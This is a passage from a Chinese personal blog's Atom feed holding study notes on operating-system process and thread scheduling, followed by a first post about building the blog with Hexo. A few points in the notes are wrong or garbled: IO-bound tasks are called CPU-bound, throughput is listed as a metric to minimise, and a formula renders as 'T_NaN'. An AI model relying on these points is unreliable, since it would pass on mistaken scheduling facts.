(RR,时间片轮转)</li><li>Priority<ol><li>Statically Priority         (静态优先级)</li><li>Dynamically Priority        (动态优先级)</li></ol></li><li>Shortest Process Next          (SPN, 最短进程优先)</li><li>Others</li></ol></li><li>实时操作系统 (Real-Time Systems)<ol><li>可调度性</li></ol></li></ol></li><li>关于线程调度的一些补充</li></ol><p>需要说明的是，虽然进程调度与线程调度是两种东西，但算法的核心思想是一致的，这里不过分区分。</p><h2 id="调度的概念"><a href="#调度的概念" class="headerlink" title="调度的概念"></a>调度的概念</h2><h3 id="CPU密集型任务与IO密集型任务"><a href="#CPU密集型任务与IO密集型任务" class="headerlink" title="CPU密集型任务与IO密集型任务"></a>CPU密集型任务与IO密集型任务</h3><p>如果一个任务更多地需要CPU资源 (例如Matlab, 大量的运算) 我们称之为CPU密集型任务.</p><p>如果一个任务更多地需要IO资源 (例如Word的打印任务(外设), 读写任务(外存)) 我们称之为CPU密集型任务.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200608155404.jpg" alt="不同的任务种类"></p><h3 id="调度的目的"><a href="#调度的目的" class="headerlink" title="调度的目的"></a>调度的目的</h3><p>还是考虑单核CPU, 在多道程序(即多个进程同时”工作”) 的情况下, 会出现不同进程同时需要CPU的情况. 这时候CPU的资源就需要合理分配.</p><h3 id="什么时候需要调度"><a href="#什么时候需要调度" class="headerlink" title="什么时候需要调度?"></a>什么时候需要调度?</h3><ol><li>新进程的创建</li><li>进程的退出</li><li>某进程需要IO操作,</li><li>IO设备申请CPU中断 (称之为IO中断)</li></ol><h3 id="调度的几个原则"><a href="#调度的几个原则" class="headerlink" title="调度的几个原则"></a>调度的几个原则</h3><p>我们希望什么样的调度算法?</p><h4 id="All-System"><a href="#All-System" class="headerlink" title="All System"></a>All System</h4><ol><li><p>公平</p><p>公平, 公平. 还是tmd公平</p></li><li><p>强制</p><p>策略的调度必须被强制执行</p></li><li><p>平衡</p><p>能够使系统中的各部件都保持busy</p></li></ol><h4 id="批处理系统"><a href="#批处理系统" class="headerlink" title="批处理系统"></a>批处理系统</h4><ol><li><p>吞吐量</p><p>每小时工作数</p></li><li><p>周转时间</p><p>单次作业开始结束间的时间</p></li><li><p>CPU利用率</p><p>保持CPU始终忙碌</p></li></ol><h4 id="交互式系统"><a href="#交互式系统" class="headerlink" title="交互式系统"></a>交互式系统</h4><ol><li><p>响应时间</p><p>快速回应用户请求</p></li><li><p>均衡性</p><p>满足用户请求</p></li></ol><h4 id="实时系统"><a href="#实时系统" class="headerlink" title="实时系统"></a>实时系统</h4><ol><li><p>满足deadline</p><p>保证时效性</p></li><li><p>可预测性?</p></li></ol><h2 id="调度算法"><a href="#调度算法" class="headerlink" title="调度算法"></a>调度算法</h2><h3 id="批处理系统-1"><a href="#批处理系统-1" class="headerlink" title="批处理系统"></a>批处理系统</h3><h4 id="FCFS-First-come-first-served"><a href="#FCFS-First-come-first-served" class="headerlink" title="FCFS (First-come first-served )"></a>FCFS (First-come first-served )</h4><p>字面意思  不解释</p><p><strong>优势</strong>:</p><p>便于实现, 绝对平等</p><p><strong>缺点:</strong></p><p>低CPU利用率</p><h4 id="Shortest-Job-First-短作业优先"><a href="#Shortest-Job-First-短作业优先" class="headerlink" title="Shortest Job First (短作业优先)"></a>Shortest Job First (短作业优先)</h4><p><strong>优势:</strong></p><p>提高了CPU利用率</p><p><strong>劣势:</strong></p><p>对长作业不利</p><h4 id="Shortest-remaining-time-next-剩余时间最短优先"><a href="#Shortest-remaining-time-next-剩余时间最短优先" class="headerlink" title="Shortest remaining time next 剩余时间最短优先"></a>Shortest remaining time next 剩余时间最短优先</h4><h3 id="交互式系统-1"><a href="#交互式系统-1" class="headerlink" title="交互式系统"></a>交互式系统</h3><h4 id="Round-Robin-时间片轮转"><a href="#Round-Robin-时间片轮转" class="headerlink" title="Round Robin (时间片轮转)"></a>Round Robin (时间片轮转)</h4><ul><li>每个进程被分配时设置固定的时间轮片</li><li>时间片用完或进程结束, 发生调度</li></ul><p>时间片大小的设置</p><ul><li>过短, CPU将浪费大量时间在频繁的切换上</li><li>过长, 退化成FCFS算法</li></ul><h4 id="Priority-scheduling-优先级调度"><a href="#Priority-scheduling-优先级调度" class="headerlink" title="Priority scheduling (优先级调度)"></a>Priority scheduling (优先级调度)</h4><p>算法思想:</p><ol><li>优先调度优先级高的</li><li>又优先级相同时, 采用其他算法(如FCFS)</li></ol><p>优先级:</p><ul><li>静态优先级, 优先级被确立后不改变</li><li>动态优先级, 变化</li></ul><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200608155437.jpg" alt=""></p><h4 id="Shortest-process-next-最短进程"><a href="#Shortest-process-next-最短进程" class="headerlink" title="Shortest process next (最短进程)"></a>Shortest process next (最短进程)</h4><p>SJF算法更加适用于批处理系统, 因为每次的任务费时都是确定的.</p><p>Q : 对于交互式系统, 如何预估工作的用时?</p><p>A : 根据其过往表现估算</p><script type="math/tex; mode=display">T_n = \alpha T_NaN + (1-\alpha)T_NaN</script><p>如果 <code>α = 1/2</code> ,那么预估时间为:</p><script type="math/tex; mode=display">T_0\\\frac{T_0}{2}+\frac{T_1}{2}\\\frac{T_0}{4}+\frac{T_1}{4}+\frac{T_2}{2}\\\frac{T_0}{8}+\frac{T_1}{8}+\frac{T_2}{4}+\frac{T_3}{2}</script><h4 id="其他调度算法"><a href="#其他调度算法" class="headerlink" title="其他调度算法"></a>其他调度算法</h4><ol><li><p>多级队列调度</p></li><li><p>确保(部分任务)调度</p></li><li><p>Lottery Scheduling </p><p>乐透调度, 彩票调度 随机</p></li><li><p>Fair-share Scheduling</p><p>考虑进程所属的用户</p></li></ol><h3 id="实时系统-1"><a href="#实时系统-1" class="headerlink" title="实时系统"></a>实时系统</h3><h4 id="系统的可调度性"><a href="#系统的可调度性" class="headerlink" title="系统的可调度性"></a><strong>系统的可调度性</strong></h4><p>假设某一时刻系统有 $m$ 个事件,每个事件 $i$ 需要在 $P_i$ 内完成,需要占据CPU的 $C_i$ 秒来实现<br>倘若满足</p><script type="math/tex; mode=display">\qquad \sum^{m}_{i=1}\frac{C_i}{P_i}\leq1\\</script><p>称此时系统是可调度的 (Schedulable)</p><h2 id="关于线程调度的一些补充"><a href="#关于线程调度的一些补充" class="headerlink" title="关于线程调度的一些补充"></a>关于线程调度的一些补充</h2><p>用户级线程:</p><p>OS把时间片分配给进程, 进程再内部分配到每个线程.</p><h2 id="关于调度的其他补充"><a href="#关于调度的其他补充" class="headerlink" title="关于调度的其他补充"></a>关于调度的其他补充</h2><ul><li><p>调度算法还有 抢占式/非抢占式之分</p></li><li><p>进程调度模块负责专业CPU控制权,包括:</p><ul><li>切换上下文</li><li>切换到用户态</li><li>跳转到程序适当位置并运行之</li></ul></li><li><p>算法的性能参数</p><ul><li><p>CPU利用率    (max)</p></li><li><p>Throughput  (min)</p><p>每个时间单元内进程完成的数目</p></li><li><p>周转时间  (min)</p></li><li><p>等待时间  (min)</p></li><li><p>响应时间  (min)</p></li></ul></li></ul><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200608155420.jpg" alt="用户线程调度"></p><p>系统级线程</p><p>OS直接把时间片分配到线程.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202006/img/QQ%E6%88%AA%E5%9B%BE20200608155427.jpg" alt="系统线程调度"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本章节包括三个小节&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;进程 (Processes)&lt;/li&gt;
&lt;li&gt;线程 (Threads)&lt;/li&gt;
&lt;li&gt;调度 (Scheduling)&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="专业课" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Hello_Hexo_Blog</title>
    <link href="http://yoursite.com/2020/05/31/Hello-Hexo-Blog/"/>
    <id>http://yoursite.com/2020/05/31/Hello-Hexo-Blog/</id>
    <published>2020-05-31T05:53:07.000Z</published>
    <updated>2020-06-05T09:01:50.723Z</updated>
    
    <content type="html"><![CDATA[<p> 第一篇博客~ 开心</p><a id="more"></a><h3 id="简单记录一下搭建过程"><a href="#简单记录一下搭建过程" class="headerlink" title="简单记录一下搭建过程"></a>简单记录一下搭建过程</h3><p>博客基于<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo框架</a> + Github，域名当然是阿里云了 （6元一年他不香吗hhh）</p><p>感谢舍友 <a href="https://www.117503445.top/" target="_blank" rel="noopener">@117503445</a> 指名了博客搭建的主要方向，搭建过程中主要参考了知乎用户 @吴润 的<a href="https://zhuanlan.zhihu.com/p/26625249" target="_blank" rel="noopener">这篇文章</a>，基本很顺畅地搭建起来了，一并致谢。</p><ol><li>安装并配置Node.js</li><li>安装 Hexo 框架</li><li>关联 Github 仓库</li><li>申请域名并绑定</li><li>发布第一篇博客</li></ol><h3 id="ToDo"><a href="#ToDo" class="headerlink" title="ToDo"></a>ToDo</h3><p>现在只是把房子搭起来还没有装修啥啊，让俺接着去学一学~</p><p>[x] 更换 Hexo 主题</p><p>[x] 熟悉博客的发布修改标签等功能</p><p>[ ] 建立图床</p><p>[ ] 增加其他的小插件 ~~</p><h3 id="分类设置"><a href="#分类设置" class="headerlink" title="分类设置"></a>分类设置</h3><ul><li>学习笔记    | 系统性的学习<ul><li>专业课<ul><li>操作系统</li></ul></li></ul></li><li>技术小记    | 碎片化知识</li><li>生活随笔<ul><li>山与水    | 游记</li><li>书与影    | 书评影评</li><li>时与光    | 定期总结</li></ul></li><li></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; 第一篇博客~ 开心&lt;/p&gt;
    
    </summary>
    
    
      <category term="技术小记" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%B0%8F%E8%AE%B0/"/>
    
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
  </entry>
  
</feed>
